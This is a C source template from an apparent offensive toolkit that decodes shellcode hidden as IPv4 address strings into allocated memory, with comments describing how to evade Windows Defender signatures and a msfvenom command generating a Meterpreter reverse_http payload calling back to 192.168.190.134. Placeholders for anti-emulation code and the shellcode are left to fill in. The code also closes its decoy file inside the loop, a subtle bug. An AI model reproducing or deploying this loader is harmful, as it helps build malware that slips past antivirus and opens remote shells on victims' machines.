#include <Windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

// read array of shellcode formatted as IPv4 addresses
// https://gitlab.com/ORCA000/hellshell/-/blob/main/IPv4Fuscation/Ipv4Fuscation.cpp
// https://infosecwriteups.com/the-art-of-obfuscation-evading-static-malware-detection-f4663ae4716f

// compile: 
//  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2ipv4.c /link /OUT:bin2ipv4.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

// Define our ustring struct
struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

int DecodeIPv4Fuscation(const char* IPV4[], void * LpBaseAddress, int arrSize) {
	// Defender will detect this function if we don't do something to change the signature
	// Write some output to the NULL device
	FILE* outfile = fopen("nul", "w");
	
	PCSTR Terminator = NULL;
	void * LpBaseAddress2 = NULL;
	NTSTATUS STATUS;
	int i = 0;

	for (int j = 0; j < arrSize; j++) {
		LpBaseAddress2 = ((ULONG_PTR)LpBaseAddress + i);
		if (RtlIpv4StringToAddressA((PCSTR)IPV4[j], TRUE, &Terminator, LpBaseAddress2) != STATUS_SUCCESS) {
			printf("[!] RtlIpv4StringToAddressA failed for %s result %x", IPV4[j], STATUS);
			return 1;
		}
		else {
			i = i + 4;
			fputs("out", outfile);
		}

		fclose(outfile); // close the decoy file

	}
	return 0;
}

int main(void) {
	// Shellcode as array of IP Addresses
	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
	// python3 bin2ip.py -v 4 -i met.bin
	{{ANTI_EMULATION}}

	{{SHELLCODE}}
	
	// declare a variable for our shellcode size
 	unsigned int shellcode_size = (sizeof(IPv4s) / sizeof(IPv4s[0])) * 4;
	
	// Declare a buffer for storing our shellcode
	PVOID buffer = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	
    // Decode IPs and copy into memory
    if (DecodeIPv4Fuscation(&IPv4s, buffer, sizeof(IPv4s) / sizeof(IPv4s[0])) != 0) {
            return -1;
    }

	// create a new struct from the buffer we allocated
	_data.Buffer = buffer;
	_data.Length = shellcode_size;
	
	int idx = 0;
	while ( idx < _data.Length)
	{
		if (idx == (shellcode_size - 1) )
		{
			printf("0x%02x ", _data.Buffer[idx]);
		}
		else
		{
			printf("0x%02x, ", _data.Buffer[idx]);
		}
		idx++;
	}

    return 0;
}

